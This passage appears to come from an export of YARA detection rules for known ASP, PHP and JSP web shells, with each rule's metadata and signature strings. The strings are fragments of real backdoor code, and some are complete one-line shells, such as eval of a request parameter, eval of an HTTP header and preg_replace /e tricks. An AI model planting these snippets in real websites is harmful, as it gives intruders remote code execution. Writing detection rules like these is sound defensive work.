WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file aaa.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Function fvm(jwv):If jwv=\\\"\\\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\\\"\" \n      $s5 = \"<option value=\\\"\\\"DROP TABLE [jnc];exec mast\\\"&kvp&\\\"er..xp_regwrite 'HKEY_LOCAL\" \n      $s17 = \"if qpv=\\\"\\\" then qpv=\\\"x:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.0\\\\my.ini\\\"&br&\" \n   condition: \n      1 of them\n}","date":"2014-03-28 13:29:31","description":"Web shells - generated from file aaa.asp","minimum_yara":"1.7","name":"Webshell_webshells_new_aaa_RID319A","reference":"-","required_modules":[],"rule_hash":"a435e454883b8930669b133bfce8d53f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Expdoor_com_ASP_RID3068 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file Expdoor.com ASP.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 12:38:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"\\\">www.Expdoor.com</a>\" fullword\n      $s5 = \"    <input name=\\\"FileName\\\" type=\\\"text\\\" value=\\\"Asp_ver.Asp\\\" size=\\\"20\\\" max\" \n      $s10 = \"set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '\" fullword\n      $s14 = \"set fs=server.CreateObject(\\\"Scripting.FileSystemObject\\\")   '\" fullword\n      $s16 = \"<TITLE>Expdoor.com ASP\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-28 12:38:31","description":"Web shells - generated from file Expdoor.com ASP.asp","minimum_yara":"1.7","name":"Webshell_Expdoor_com_ASP_RID3068","reference":"-","required_modules":[],"rule_hash":"d099b99eace9fa517753848a45f6e79f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_Asp_RID319B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file Asp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Execute MorfiCoder(\\\")/*/z/*/(tseuqer lave\\\")\" fullword\n      $s2 = \"Function MorfiCoder(Code)\" fullword\n      $s3 = \"MorfiCoder=Replace(Replace(StrReverse(Code),\\\"/*/\\\",\\\"\\\"\\\"\\\"),\\\"\\\\*\\\\\\\",vbCrlf)\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-28 13:29:41","description":"Web shells - generated from file Asp.asp","minimum_yara":"1.7","name":"Webshell_webshells_new_Asp_RID319B","reference":"-","required_modules":[],"rule_hash":"888efef293daaf60f3542ae76d859f51","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_sig_404super_RID2F0F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file 404super.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 11:41:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"$i = pack('c*', 0x70, 0x61, 99, 107);\" fullword\n      $s6 = \"    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),\" fullword\n      $s7 = \"//http://require.duapp.com/session.php\" fullword\n      $s8 = \"if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}\" fullword\n      $s12 = \"//define('pass','123456');\" fullword\n      $s13 = \"$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO\" \n   condition: \n      1 of them\n}","date":"2014-03-28 11:41:01","description":"Web shells - generated from file 404super.php","minimum_yara":"1.7","name":"Webshell_sig_404super_RID2F0F","reference":"-","required_modules":[],"rule_hash":"8095c3cd61dfa77cac3f2b13b350149b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_JSP_RID3164 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file JSP.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:20:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i\" \n      $s5 = \"bw.write(z2);bw.close();sb.append(\\\"1\\\");}else if(Z.equals(\\\"E\\\")){EE(z1);sb.app\" \n      $s11 = \"if(Z.equals(\\\"A\\\")){String s=new File(application.getRealPath(request.getRequest\" \n   condition: \n      1 of them\n}","date":"2014-03-28 13:20:31","description":"Web shells - generated from file JSP.jsp","minimum_yara":"1.7","name":"Webshell_webshells_new_JSP_RID3164","reference":"-","required_modules":[],"rule_hash":"e01b320241532c2097eca662ab72b941","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshell_123_RID2EF1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file webshell-123.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 11:36:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"// Web Shell!!\" fullword\n      $s1 = \"@preg_replace(\\\"/.*/e\\\",\\\"\\\\x65\\\\x76\\\\x61\\\\x6C\\\\x28\\\\x67\\\\x7A\\\\x69\\\\x6E\\\\x66\\\\x6\" \n      $s3 = \"$default_charset = \\\"UTF-8\\\";\" fullword\n      $s4 = \"// url:http://www.weigongkai.com/shell/\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-28 11:36:01","description":"Web shells - generated from file webshell-123.php","minimum_yara":"1.7","name":"Webshell_webshell_123_RID2EF1","reference":"-","required_modules":[],"rule_hash":"fbbaf0d200f76840ed2d40bb1a5e875e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_dev_core_RID2DED : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file dev_core.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 10:52:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {\" fullword\n      $s9 = \"setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);\" fullword\n      $s10 = \"$_SESSION['code'] = _REQUEST(sprintf(\\\"%s?%s\\\",pack(\\\"H*\\\",'6874\" \n      $s11 = \"if (preg_match(\\\"/^HTTP\\\\/\\\\d\\\\.\\\\d\\\\s([\\\\d]+)\\\\s.*$/\\\", $status, $matches))\" \n      $s12 = \"eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C\" \n      $s15 = \"if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))\" \n   condition: \n      1 of them\n}","date":"2014-03-28 10:52:41","description":"Web shells - generated from file dev_core.php","minimum_yara":"1.7","name":"Webshell_dev_core_RID2DED","reference":"-","required_modules":[],"rule_hash":"63a3289dc1aac64d4113bc285f77b170","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_pHp_RID319F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file pHp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(is_readable($path)) antivirus($path.'/',$exs,$matches);\" fullword\n      $s1 = \"'/(eval|assert|include|require|include\\\\_once|require\\\\_once|array\\\\_map|arr\" \n      $s13 = \"'/(exec|shell\\\\_exec|system|passthru)+\\\\s*\\\\(\\\\s*\\\\$\\\\_(\\\\w+)\\\\[(.*)\\\\]\\\\s*\" \n      $s14 = \"'/(include|require|include\\\\_once|require\\\\_once)+\\\\s*\\\\(\\\\s*[\\\\'|\\\\\\\"](\\\\w+\" \n      $s19 = \"'/\\\\$\\\\_(\\\\w+)(.*)(eval|assert|include|require|include\\\\_once|require\\\\_once\" \n   condition: \n      1 of them\n}","date":"2014-03-28 13:30:21","description":"Web shells - generated from file pHp.php","minimum_yara":"1.7","name":"Webshell_webshells_new_pHp_RID319F","reference":"-","required_modules":[],"rule_hash":"01ba0f0d7c4b4189203d9935a511ca69","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_code_RID3212 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file code.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:49:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<a class=\\\"high2\\\" href=\\\"javascript:;;;\\\" name=\\\"action=show&dir=$_ipage_fi\" \n      $s7 = \"$file = !empty($_POST[\\\"dir\\\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO\" \n      $s10 = \"if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_\" \n      $s14 = \"Processed in <span id=\\\"runtime\\\"></span> second(s) {gzip} usage:\" \n      $s17 = \"<a href=\\\"javascript:;;;\\\" name=\\\"{return_link}\\\" onclick=\\\"fileperm\" \n   condition: \n      1 of them\n}","date":"2014-03-28 13:49:31","description":"Web shells - generated from file code.php","minimum_yara":"1.7","name":"Webshell_webshells_new_code_RID3212","reference":"-","required_modules":[],"rule_hash":"5a71d9a9893a8977e88f9ecbc67e67ab","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_PHP1_RID3190 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file PHP1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:27:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>\" fullword\n      $s2 = \":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316\" fullword\n      $s3 = \"@preg_replace(\\\"/f/e\\\",$_GET['u'],\\\"fengjiao\\\"); \" fullword\n   condition: \n      1 of them\n}","date":"2014-03-28 13:27:51","description":"Web shells - generated from file PHP1.php","minimum_yara":"1.7","name":"Webshell_webshells_new_PHP1_RID3190","reference":"-","required_modules":[],"rule_hash":"90ac853aaaaef7bf0beeb5c455c3e855","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_JJJsp2_RID326A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file JJJsp2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:04:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"QQ(cs, z1, z2, sb,z2.indexOf(\\\"-to:\\\")!=-1?z2.substring(z2.indexOf(\\\"-to:\\\")+4,z\" \n      $s8 = \"sb.append(l[i].getName() + \\\"/\\\\t\\\" + sT + \\\"\\\\t\\\" + l[i].length()+ \\\"\\\\t\\\" + sQ\" \n      $s10 = \"ResultSet r = s.indexOf(\\\"jdbc:oracle\\\")!=-1?c.getMetaData()\" \n      $s11 = \"return DriverManager.getConnection(x[1].trim()+\\\":\\\"+x[4],x[2].equalsIgnoreCase(\" \n   condition: \n      1 of them\n}","date":"2014-03-28 14:04:11","description":"Web shells - generated from file JJJsp2.jsp","minimum_yara":"1.7","name":"Webshell_webshells_new_JJJsp2_RID326A","reference":"-","required_modules":[],"rule_hash":"14492c05d09357d8280227ae01060c0e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_PHP_RID315F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file PHP.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:19:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"<font color=blue>Error!</font>\\\";\" fullword\n      $s2 = \"<input type=\\\"text\\\" size=61 name=\\\"f\\\" value='<?php echo $_SERVER[\\\"SCRIPT_FILE\" \n      $s5 = \" - ExpDoor.com</title>\" fullword\n      $s10 = \"$f=fopen($_POST[\\\"f\\\"],\\\"w\\\");\" fullword\n      $s12 = \"<textarea name=\\\"c\\\" cols=60 rows=15></textarea><br>\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-28 13:19:41","description":"Web shells - generated from file PHP.php","minimum_yara":"1.7","name":"Webshell_webshells_new_PHP_RID315F","reference":"-","required_modules":[],"rule_hash":"b8e69f1218f35f78b0efc6a245a628a1","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_sql_RID2D3D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file sql.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:23:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$result=mysql_list_tables($db) or die (\\\"$h_error<b>\\\".mysql_error().\\\"</b>$f_\" \n      $s4 = \"print \\\"<a href=\\\\\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:23:21","description":"Web Shell - file sql.php","minimum_yara":"1.7","name":"Webshell_PHP_sql_RID2D3D","reference":"-","required_modules":[],"rule_hash":"cac31b27a36888a9460745392d9e46e5","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_a_RID2C4E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file a.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:43:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"<option value=\\\\\\\"\\\". strrev(substr(strstr(strrev($work_dir), \\\"/\\\"\" \n      $s2 = \"echo \\\"<option value=\\\\\\\"$work_dir\\\\\\\" selected>Current Directory</option>\" \n      $s4 = \"<input name=\\\"submit_btn\\\" type=\\\"submit\\\" value=\\\"Execute Command\\\"></p> \" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 09:43:31","description":"Web Shell - file a.php","minimum_yara":"1.7","name":"Webshell_PHP_a_RID2C4E","reference":"-","required_modules":[],"rule_hash":"ed9889061fe343988666e49754a4f744","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_iMHaPFtp_2_RID2E10 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file iMHaPFtp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:58:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"if ($l) echo '<a href=\\\"' . $self . '?action=permission&amp;file=' . urlencode($\" \n      $s9 = \"return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA\" \n   condition: \n      1 of them\n}","date":"2014-01-28 10:58:31","description":"Web Shell - file iMHaPFtp.php","minimum_yara":"1.7","name":"Webshell_iMHaPFtp_2_RID2E10","reference":"-","required_modules":[],"rule_hash":"378715da456c8060dec8d47e97484d28","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Jspspyweb_RID2E6D : DEMO T1050 T1100 T1112 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Jspspyweb.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:14:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1050, T1100, T1112, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"      out.print(\\\"<tr><td width='60%'>\\\"+strCut(convertPath(list[i].getPath()),7\" \n      $s3 = \"  \\\"reg add \\\\\\\"HKEY_LOCAL_MACHINE\\\\\\\\SYSTEM\\\\\\\\CurrentControlSet\\\\\\\\Control\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:14:01","description":"Web Shell - file Jspspyweb.jsp","minimum_yara":"1.7","name":"Webshell_Jspspyweb_RID2E6D","reference":"-","required_modules":[],"rule_hash":"9723c6c53e5386dbe44b06964f38bdd2","score":70,"tags":["T1100","DEMO","WEBSHELL","T1112","T1050"]},{"author":"Florian Roth","content":"rule Webshell_phpshell_2_1_pwhash_RID3211 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file pwhash.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:49:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<tt>&nbsp;</tt>\\\" (space), \\\"<tt>[</tt>\\\" (left bracket), \\\"<tt>|</tt>\\\" (pi\" \n      $s3 = \"word: \\\"<tt>null</tt>\\\", \\\"<tt>yes</tt>\\\", \\\"<tt>no</tt>\\\", \\\"<tt>true</tt>\\\",\" \n   condition: \n      1 of them\n}","date":"2014-01-28 13:49:21","description":"Web Shell - file pwhash.php","minimum_yara":"1.7","name":"Webshell_phpshell_2_1_pwhash_RID3211","reference":"-","required_modules":[],"rule_hash":"d95e6b88c10f8190b850724a5348c457","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHPRemoteView_RID2F95 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PHPRemoteView.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:03:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<input type=submit value='\\\".mm(\\\"Delete all dir/files recursive\\\").\\\" (rm -fr)'\" \n      $s4 = \"<a href='$self?c=delete&c2=$c2&confirm=delete&d=\\\".urlencode($d).\\\"&f=\\\".u\" \n   condition: \n      1 of them\n}","date":"2014-01-28 12:03:21","description":"Web Shell - file PHPRemoteView.php","minimum_yara":"1.7","name":"Webshell_PHPRemoteView_RID2F95","reference":"-","required_modules":[],"rule_hash":"68755941ac4aab316b5a574803ce817b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_12302_RID2D4A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 12302.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:25:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"</font><%out.print(request.getRealPath(request.getServletPath())); %>\" fullword\n      $s1 = \"<%@page import=\\\"java.io.*,java.util.*,java.net.*\\\"%>\" fullword\n      $s4 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859-1\\\"\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:25:31","description":"Web Shell - file 12302.jsp","minimum_yara":"1.7","name":"Webshell_jsp_12302_RID2D4A","reference":"-","required_modules":[],"rule_hash":"0716535baaa04c57f4a20244c172b751","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_caidao_shell_guo_RID3128 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file guo.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:10:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php ($www= $_POST['ice'])!\" \n      $s1 = \"@preg_replace('/ad/e','@'.str_rot13('riny').'($ww\" \n   condition: \n      1 of them\n}","date":"2014-01-28 13:10:31","description":"Web Shell - file guo.php","minimum_yara":"1.7","name":"Webshell_caidao_shell_guo_RID3128","reference":"-","required_modules":[],"rule_hash":"040ddcec845239c7252b2dc932ce57e4","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_redcod_RID2E5E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file redcod.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:11:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw\" fullword\n      $s1 = \"HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:11:31","description":"Web Shell - file redcod.php","minimum_yara":"1.7","name":"Webshell_PHP_redcod_RID2E5E","reference":"-","required_modules":[],"rule_hash":"b10ee9348abc0854fa24499e91570560","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_remview_fix_RID2F4B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file remview_fix.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"<a href='$self?c=delete&c2=$c2&confirm=delete&d=\\\".urlencode($d).\\\"&f=\\\".u\" \n      $s5 = \"echo \\\"<P><hr size=1 noshade>\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\" \n   condition: \n      1 of them\n}","date":"2014-01-28 11:51:01","description":"Web Shell - file remview_fix.php","minimum_yara":"1.7","name":"Webshell_remview_fix_RID2F4B","reference":"-","required_modules":[],"rule_hash":"d561970407ca6952f2b3e487e6eeefeb","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_sh_server_RID301E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file server.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:26:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(getenv('HTTP_CODE'));\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 12:26:11","description":"Web Shell - file server.php","minimum_yara":"1.7","name":"Webshell_php_sh_server_RID301E","reference":"-","required_modules":[],"rule_hash":"9e3998b28d2e1c40e04723dc1eb2e663","score":50,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PH_Vayv_PH_Vayv_RID303F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PH Vayv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"style=\\\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in\" \n      $s4 = \"<font color=\\\"#858585\\\">SHOPEN</font></a></font><font face=\\\"Verdana\\\" style\" \n   condition: \n      1 of them\n}","date":"2014-01-28 12:31:41","description":"Web Shell - file PH Vayv.php","minimum_yara":"1.7","name":"Webshell_PH_Vayv_PH_Vayv_RID303F","reference":"-","required_modules":[],"rule_hash":"dbcfd1e193abf474a55193052e0a1422","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_caidao_shell_ice_RID310E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ice.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:06:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%eval request(\\\"ice\\\")%>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 13:06:11","description":"Web Shell - file ice.asp","minimum_yara":"1.7","name":"Webshell_caidao_shell_ice_RID310E","reference":"-","required_modules":[],"rule_hash":"e7017d29e581fd82557b47d5fb121a9c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cihshell_fix_RID2F98 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cihshell_fix.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:03:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty\" \n      $s8 = \"if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos\" \n   condition: \n      1 of them\n}","date":"2014-01-28 12:03:51","description":"Web Shell - file cihshell_fix.php","minimum_yara":"1.7","name":"Webshell_cihshell_fix_RID2F98","reference":"-","required_modules":[],"rule_hash":"c4ba8ced33f662438127932c8bd6a7dc","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_shell_RID2E61 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file shell.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:12:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, 